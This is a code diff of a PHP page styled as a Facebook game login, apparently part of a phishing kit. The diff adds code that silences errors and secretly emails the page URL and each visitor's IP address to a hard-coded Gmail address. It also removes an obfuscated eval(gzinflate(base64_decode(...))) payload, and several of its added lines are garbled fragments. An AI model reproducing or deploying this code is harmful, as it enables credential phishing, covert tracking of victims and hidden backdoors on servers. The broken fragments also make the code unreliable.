@@ -1,5 +1,21 @@
 <?php
 include 'lock.php';
+@
+@ini_se
+ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+
+set
+set_time_limit(0);
+
+ini
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+
+$tujuanmail = 'reyhansyah4@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "RaBiitch", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 <!doctype html>
 <html lang="zh">
@@ -377,7 +393,7 @@ input:-moz-placeholder,input::-moz-placeholder {
 		<div class="navbar-fb">
 			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
 		</div>
-<?php eval(gzinflate(base64_decode('jY9Na8JAEIbvgfyHYRE2lqgtlrYkCNqaggf7EWMvIsvWrMmW7GbZTED/fTeVir31NDDP+zEzlVqyRmBA6xZNi+yz3e+FlbqgIVz3Y5ieBblsTMWPTFhb2+aEfc8hhlIJVkklMegsZ4cSqrbHE3F6ene7pI6XgufCBvSp1ig0DrKjEZHvoTjgqERVxbAruXUJk3X2PHjoLD1sv1quFZcVTIAqXoiK6+JmPL6fFt12uKsVdboDMxxL35sAKRFNNBoRGEKPrZL0I0k39DTZy2yZ0O0fkibv62SVsXW6oFv3WM+IhmvGK2HRdZK9PPzGQ2TgavEGszy3omkggg24Gue5SFu+ZgmbzefpTw+BLYmhuzS4+CX0PZLyRylxV5IQLitDIP8K7cff'))); ?>
+
 		<div class="content-box-fb">
 			<img src="img/icon.png">
 			<div class="txt-login-fb">
@@ -470,8 +486,9 @@ input:-moz-placeholder,input::-moz-placeholder {
                  }
 				
 				function LoginGameId() {
-                   $("#loginGameIdBox").show();
+    					$("#loginGameIdBox").show();
 				}
+
 				function TutupLogin() {
 				   $("#loginGameIdBox").hide();
 				}
